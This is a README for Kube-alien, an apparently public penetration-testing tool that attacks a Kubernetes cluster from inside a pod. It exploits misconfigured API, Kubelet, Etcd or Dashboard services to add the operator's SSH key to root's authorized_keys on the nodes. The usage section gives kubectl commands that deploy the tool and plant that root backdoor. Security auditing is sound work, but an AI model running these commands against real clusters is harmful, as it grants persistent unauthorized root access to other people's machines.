# Kube-alien

This tool launches attack on k8s cluster from within. That means you already need to have an access with permission to deploy pods 
in a cluster to run it. After running the kube-alien pod it tries to takeover cluster's nodes by adding your public key to node's 
/root/.ssh/authorized_keys file by using this image https://github.com/nixwizard/dockercloud-authorizedkeys (Can be adjusted using 
ADD_AUTHKEYS_IMAGE param in config.py) forked from docker/dockercloud-authorizedkeys.
The attack succeedes if there is a misconfiguration in one of the cluster's components it goes along the following vectors:

- Kubernetes API
- Kubelet service
- Etcd service
- Kubernetes-Dashboard

What is the purpose of this tool? 
- While doing security audit of a k8s cluster one can quickly assess it's security posture.
- Partical demostration of the mentioned attack vectors exploitation.

How can k8s cluster be attacked from within in a real life?
- RCE or SSRF vunerability in an app which is being run in one of your cluster's pods.

# Usage
Kube-alien image should be pushed to your dockerhub(or other registry) before using with this tool.

git clone https://github.com/nixwizard/kube-alien.git<BR>
cd kube-alien<BR>
docker build -t ka ./<BR>
docker tag ka YOUR_DOCKERHUB_ACCOUNT/kube-alien:ka<BR>
docker push YOUR_DOCKERHUB_ACCOUNT/kube-alien:ka<BR>

The AUTHORIZED_KEYS env required to be set to the value of your ssh public key, in case of success the public key will be added to all 
node's root's authorized_keys file.<BR>

kubectl run --image=YOUR_DOCKERHUB_ACCOUNT/kube-alien kube-alien --env="AUTHORIZED_KEYS=$(cat ~/.ssh/id_rsa.pub)" --restart Never<BR>

or you may use my image for quick testing purpose:<BR>

kubectl run --image=nixwizard/kube-alien kube-alien --env="AUTHORIZED_KEYS="$(cat ~/.ssh/id_rsa.pub)" --restart Never<BR>

Check Kube-alien pod's logs to see if attack was successful:<BR>
kubectl logs $(kubectl get pods| grep alien|cut -f1 -d' ')<BR>


# The following resources helped me a lot in creating this tool
- https://www.youtube.com/watch?v=vTgQLzeBfRU
- https://www.youtube.com/watch?v=dxKpCO2dAy8 (and other awesome posts on kubernetes attack surface at https://raesene.github.io)
- https://medium.com/handy-tech/analysis-of-a-kubernetes-hack-backdooring-through-kubelet-823be5c3d67c
